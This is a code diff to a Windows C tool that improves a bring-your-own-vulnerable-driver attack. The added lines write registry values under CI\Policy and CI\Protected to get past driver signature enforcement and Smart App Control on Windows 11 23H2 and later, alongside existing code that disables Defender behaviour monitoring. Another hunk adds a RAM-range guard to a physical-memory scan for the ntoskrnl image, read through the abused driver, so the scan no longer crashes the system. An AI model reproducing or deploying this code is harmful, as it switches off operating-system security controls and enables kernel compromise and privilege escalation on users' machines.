@@ -202,6 +202,29 @@ static void apply_vdb_hvci_fix(void) {
         RegSetValueExA(hk,"DisableBehaviorMonitoring",0,REG_DWORD,(BYTE*)&one,4);
         RegCloseKey(hk);
     }
+    /* Win11 23H2+ (build 22631+): CI\Policy is evaluated by CI.dll at driver load AFTER
+     * CI\Config is checked.  Even with VulnerableDriverBlocklistEnable=0, drivers get
+     * ERROR_DRIVER_BLOCKED (1275) on 23H2/24H2/25H2 unless this key is also cleared.
+     * This is the second DSE gate that Core Isolation UI does NOT expose. */
+    if (get_win_build() >= 22631) {
+        if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+            "SYSTEM\\CurrentControlSet\\Control\\CI\\Policy",0,NULL,
+            REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
+            RegSetValueExA(hk,"UpgradedSystem",0,REG_DWORD,(BYTE*)&zero,4);
+            RegSetValueExA(hk,"TrustType",0,REG_DWORD,(BYTE*)&zero,4);
+            RegCloseKey(hk);
+        }
+        /* Win11 25H2 (build 26100+): Smart App Control adds CI\Protected which enforces
+         * WDAC-grade blocking even when all previous keys are cleared. */
+        if (get_win_build() >= 26100) {
+            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+                "SYSTEM\\CurrentControlSet\\Control\\CI\\Protected",0,NULL,
+                REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
+                RegSetValueExA(hk,"State",0,REG_DWORD,(BYTE*)&zero,4);
+                RegCloseKey(hk);
+            }
+        }
+    }
 }
 /* Removed is_wdac_permanent() — it was checking VulnerableDriverBlocklistEnable==0, but
    apply_vdb_hvci_fix() sets it to 0 itself, causing a permanent false-positive exit-3.
@@ -420,22 +443,41 @@ static void build_ram_ranges(void) {
     logf("[*] build_ram_ranges: %d range(s) found", g_nRanges);
 }
 
-/* find ntoskrnl physical base by scanning 2MB-aligned pages for MZ+PE */
+/* find ntoskrnl physical base by scanning 2MB-aligned pages for MZ+PE.
+ *
+ * ROOT CAUSE of KMODE_EXCEPTION_NOT_HANDLED on Win11 23H2 / 24H2 / 25H2:
+ * the old code scanned ALL physical addresses 0x100000–0x80000000 in 2MB
+ * steps with zero MMIO filtering.  On systems where a GPU BAR (resizable
+ * BAR / PCIe window) is mapped below 2 GB, the BYOVD IOCTL reads MMIO
+ * memory → hardware bus error in the kernel → KMODE_EXCEPTION_NOT_HANDLED.
+ *
+ * Fix: call build_ram_ranges() first and restrict 2MB-aligned probes to
+ * addresses that fall inside a known RAM range — identical guard to the
+ * one already in find_system_eprocess_phys(). */
 static UINT64 find_ntoskrnl_phys(UINT64 ntoskrnl_kva) {
-    /* Scan 0x100000 to 0x80000000 in 0x200000 (2MB) steps */
+    build_ram_ranges();  /* populate g_physRanges — same as EPROCESS scan */
+
     for(UINT64 pa=0x100000; pa<0x80000000; pa+=0x200000) {
+        /* Skip this address if it falls outside every known RAM range.
+         * g_nRanges==0 means registry read failed → fall back to unguarded
+         * scan (old behaviour) so we don't regress on very old systems. */
+        if (g_nRanges > 0) {
+            BOOL inRam = FALSE;
+            for (int ri = 0; ri < g_nRanges; ri++) {
+                if (pa >= g_physRanges[ri].base &&
+                    pa <  g_physRanges[ri].base + g_physRanges[ri].len) {
+                    inRam = TRUE; break;
+                }
+            }
+            if (!inRam) continue;
+        }
         UINT64 hdr=pr8(pa);
-        /* check for MZ at byte 0 */
         if((hdr&0xFFFF)!=0x5A4D) continue;  /* MZ */
-        /* read PE offset at +0x3C */
         UINT64 peoff_q=pr8(pa+0x38);
         UINT32 peoff=(UINT32)(peoff_q>>32);  /* bytes 0x3C-0x3F of page */
         if(peoff<0x40||peoff>0x1000) continue;
         UINT64 pesig=pr8(pa+peoff);
         if((pesig&0xFFFF)!=0x4550) continue;  /* PE */
-        /* looks like a PE; check TimeDateStamp vicinity for ntoskrnl size */
-        /* verify this is ntoskrnl by checking it spans the known VA range */
-        /* approximation: trust first hit that has plausible PE at 2MB alignment */
         logf("[*] ntoskrnl PE candidate at phys=0x%016llX",(unsigned long long)pa);
         return pa;
     }
